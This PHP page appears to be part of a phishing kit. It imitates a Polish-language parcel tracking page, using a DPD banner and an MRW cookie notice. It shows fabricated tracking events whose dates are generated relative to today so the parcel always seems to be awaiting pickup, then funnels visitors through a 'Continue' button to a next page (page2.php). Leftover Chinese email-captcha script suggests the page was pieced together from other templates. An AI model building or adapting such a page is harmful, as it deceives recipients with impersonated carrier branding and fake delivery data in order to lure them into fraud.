<?php
include('header_.php');
?>
<style type="text/css">
    .home-bg-banner {
        background-image: url('https://www.dpd.com/wp-content/uploads/sites/226/2023/09/DPD_B2C_mobile_header_cms_600x325_v2.png');
        -o-object-fit: cover;
        object-fit: cover;
        -webkit-background-size: cover;
        background-size: cover;
        background-position: center center;
        background-repeat: no-repeat;
        height: 220px;
        position: relative;
    }

    .banner-right {
        position: absolute;
        bottom: 24px;
        left: 12px;
        color: white;
    }

    .home-input-search {
        border: 1px solid black;
    }

    .search_icon_home_banner {
        position: absolute;
        right: 12px;
        top: 12px;
    }

    .home-heading {
        font-weight: 600;
        font-size: 17px;
        font-weight: 500;
        line-height: 26px;
    }

    .row {
        display: flex;
    }

    /* .col {
                flex: 1;
            } */

    .progress-bar {
        width: 100%;
        height: 10px;
        background-color: #eee;
        border-radius: 10px;
        /* margin: 50px auto; */
    }

    .progress {
        height: 100%;
        width: 55%;
        background-color: #4caf50;
        border-radius: 8px;
        float: right;
    }

    .progress-two {
        height: 100%;
        width: 38%;
        background-color: #ccc;
        border-radius: 8px;
    }

    .left-green {
        display: none;
    }

    .right-red:after,
    .right-red:before {
        background: red;
    }

    .green-button {
        background-color: green;
        color: white;
        padding: 10px 70px;
        text-align: center;
        text-decoration: none;
        display: inline-block;
        font-size: 16px;
        margin: 4px 2px;
        cursor: pointer;
        border-radius: 4px;
        margin-left: auto;
        margin-right: auto;
        display: block;
    }

    .sub-title {
        text-align: center;
    }

    .position-relative {
        position: relative;
    }

    .center-logo-bg {
        position: absolute;
        top: -42px;
        display: flex;
        justify-content: center;
        width: 100%;
    }

    .center-logo-bg span {
        width: 101px;
        text-align: center;
        display: flex;
        justify-content: center;
        background: #fff;
        padding: 5px;
    }

    .center-logo-bg span img {
        width: 31px;
    }

    .before-progress-abr {
        margin-top: 16px;
        margin-bottom: 51px;
        position: relative;
    }

    .before-progress-abr .amb-img-div {
        position: absolute;
        top: 1px;
        left: 35%;
    }

    .driver-amb-bg {
        position: absolute;
        left: 35px;
        top: 7px;
        z-index: -1;
        height: 50px;
    }

    .driver-details {
        height: fit-content;
        margin-top: auto;
        margin-bottom: auto;
        margin-left: 64px;
        margin-right: 10px;
    }

    .alrt-modify {
        border: none;
        box-shadow: 0px 2px 16px 0px #f30a0a3d;
        background: #fff;
        border-radius: 28px;
        margin-top: 37px;
    }

    .icon-alert {
        font-size: 23px;
        color: #F44336;
    }

    .red-gray::before {
        background-color: rgb(11, 35, 30) !important;
        z-index: 999;
    }

    .right-red {
        padding: 2px 0px 14px 20px;
    }

    .tb td {
        padding: 5px;
    }

    .tb th {

        padding: 5px;
    }

    .bottom-prompt {
        position: fixed;
        bottom: 0px;
        background-color: #19133bd1;
        padding: 10px;
        color: white;
    }
</style>

<!-- main Start -->
<div class="bottom-prompt" hidden>
    <div>En MRW utilizamos cookies propias para poder ofrecerte nuestros servicios, y cookies de tergeros para analizar el tráfico en nuestro sitio y mostrarte publicidad relacionada con tus preferencias en base a un perfil elaborado a partir de tus hábitos de navegación.</div>
    <div style="display: flex; gap: 10px; margin-top: 20px;">
        <button onclick="removePrompt()" style="padding: 3px 10px; color: wheat; background: gray">Rechazar</button>
        <button onclick="removePrompt()" style="padding: 3px 10px; color: wheat; background: blue">Aceptar</button>
        <button onclick="removePrompt()" style="padding: 3px 10px; color: #fe4438; background: transparent">Configurar cookies...</button>
    </div>
</div>
<section style="background-color: #fff;">
    <div id="c_overlay" class=""></div>


    <div style="padding: 20px;">
        <div style="font-weight: 600; font-size: 34px;">
            Śledzenie przesyłki
        </div>
        <table class="tb" style="width: 100%; font-size: 14px; border-spacing: 15px;">
            <tr style="border-bottom: 1px solid black; padding-bottom: 10px;">

                <th>Data </th>
                <th>Godzina </th>
                <th>Stan wysyłki </th>
                <th>Lokalizacja</th>

            </tr>
            <tr>
                <td><?php echo date(DATE_FORMATE, strtotime($globalDate . ' -0 DAY +2 HOURS'));?></td>
                <td>09:52</td>
                <td>Oczekiwanie na odbiór na miejscu docelowym</td>
            </tr>
            <tr>
                <td><?php echo date(DATE_FORMATE, strtotime($globalDate . ' -1 DAY +2 HOURS'));?></td>
                <td>15:17</td>
                <td>Oczekiwanie na odbiór na miejscu docelowym</td>
            </tr>
            <tr>
                <td><?php echo date(DATE_FORMATE, strtotime($globalDate . ' -2 DAY +1 HOURS'));?></td>
                <td>18:21</td>
                <td>W drodze</td>
                <td>HUERCAL OVERA</td>
            </tr>
            <tr>
                <td><?php echo date(DATE_FORMATE, strtotime($globalDate . ' -3 DAY +1 HOURS'));?></td>
                <td>10:13</td>
                <td>Wysyłka odebrana w miejscu nadania</td>
                <td>SAN JUAN DE TERREROS</td>
            </tr>
            <tr>
                <td><?php echo date(DATE_FORMATE, strtotime($globalDate . ' -4 DAY +1 HOURS'));?></td>
                <td>10:50</td>
                <td>Odebrane w miejscu nadania</td>
                <td>SAN JUAN DE TERREROS</td>
            </tr>
            <tr>
               <td><?php echo date(DATE_FORMATE, strtotime($globalDate . ' -5 DAY +1 HOURS'));?></td>
                <td>11:20</td>
                <td>Oczekiwanie na odbiór w miejscu nadania</td>
                <td>SAN JUAN DE TERREROS</td>
            </tr>

        </table>

        <div style="margin-top: 50px;">
            <strong>Potwierdzenie dostawy za pośrednictwem e-maila</strong>
            <br>
            <br>

            Otrzymaj bezpłatne potwierdzenie dostawy na swoją skrzynkę e-mailową.
        </div>

        <div style="display: flex; justify-content: center; margin: 20px 0px;">
            <a href="page2.php"><button style="padding: 10px 16px; border-radius: 0px; color: black; background-color: #fff; border: 3px solid #ffcd00; font-size: 16px;">Kontynuuj</button></a>
        </div>


    </div>

    <div style="display: flex; justify-content: space-evenly;">
        <div style="display: flex; justify-content: end;">
            <img style="width: 165px;" src="<?php echo $folder_path;?>/images/new/demoss.png" alt="">
        </div>
        <div style="display: flex; flex-direction: column; justify-content: space-evenly; gap: 15px;">
            <div style="padding: 5px 10px; background: black; border-radius: 5px;"> <img style="width: 136px; height: 40px;" src="<?php echo $folder_path;?>/images/new/gplay.png" alt=""></div>
            <div style="padding: 5px 10px; background: black; border-radius: 5px;"> <img style="width: 136px; height: 40px;" src="<?php echo $folder_path;?>/images/new/appleStore.png" alt=""></div>
            <div style="padding: 5px 10px; background: black; border-radius: 5px;"> <img style="width: 136px; height: 40px;" src="<?php echo $folder_path;?>/images/new/huawei_store.png" alt=""></div>
        </div>
    </div>
</section>


<!-- aP End -->
<script>
    function checkForm() {
        var canGo = true;
        var custno = $("#custNo").val();
        if (custno === "") {
            $("#custNoError").show();
            canGo = false;
        }
        var answer = $("#answer").val();
        if (answer === "") {
            $("#answerError").show();
            canGo = false;
        }
        return canGo;
    }

    function errorNoticeDisplay(fieldName, noticeWarning) {
        $("#" + fieldName + "Error").show();
        $("#" + fieldName + "ErrorWarning").text(noticeWarning);
    }

    function sendEmailCaptcha() {
        var returnValue = true;
        if ($("#email").val() == "" || $("#email").val() == "請輸入Email 帳號") {
            errorNoticeDisplay('email', '請輸入Email 帳號');
            returnValue = false;
        } else {
            //var patternEmail = /^[\w\"\+-]+[\.]?[\w\"\+-]+@(\[)*\w+([\.-]?\w+)*(\.\w{2,})+(\])*$/;
            var patternEmail = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
            if (patternEmail.test($("#email").val()) == false) {
                errorNoticeDisplay('email', '請輸入合乎格式之Email 帳號');
                returnValue = false;
            } else {
                patternEmail = /@yahoo\.|@kimo\.|@icloud\.|@me\./;
                if (patternEmail.test($("#email").val().toLowerCase()) == true) {
                    errorNoticeDisplay('email',
                        '不建議使用@yahoo.、@kimo.、@icloud.及@me.信箱註冊，避免擋信!');
                }
            }
        }
        if (returnValue) {
            $.ajax({
                url: "<?php echo $folder_path;?>/captcha/sendCaptcha",
                type: "get",
                data: {
                    "email": $("#email").val()
                },
                success: function(response) {
                    $('#modal1').hide();
                    $('.modal_overlay').hide();
                    if (response) {
                        swal("驗證碼已寄出，請至電子郵件信箱收信。");
                    } else {
                        swal("驗證碼已過期，請刷新驗證碼。");
                    }

                },
                error: function(response) {
                    swal("驗證碼已過期，請刷新驗證碼。");
                }
            });
        }
    }

    $(function() {

        $(".tab-header-item").on("click", function(e) {
            e.preventDefault();
            $(".tab-header-item").removeClass("active");
            $(this).addClass("active");

            var data_tab = $(this).attr("data-tab");
            $(".tab-content").removeClass("active");
            $("#" + data_tab).addClass("active");
        });

        $('#custNo').click(function() {
            $('.annotation').show();
            $("#answer").val("");
        });

        $('#answer').focus(function() {
            $("#answer").val("");

        });
        $('#answer').keyup(function() {
            var ans = $("#answer").val();
            $("#answer").val(toASCII(ans));
        });

    });
</script>





<script>
    function removePrompt() {
        document.getElementsByClassName('bottom-prompt')[0].style.display = 'none'
    }

</script>
<?php include('footer_.php'); ?>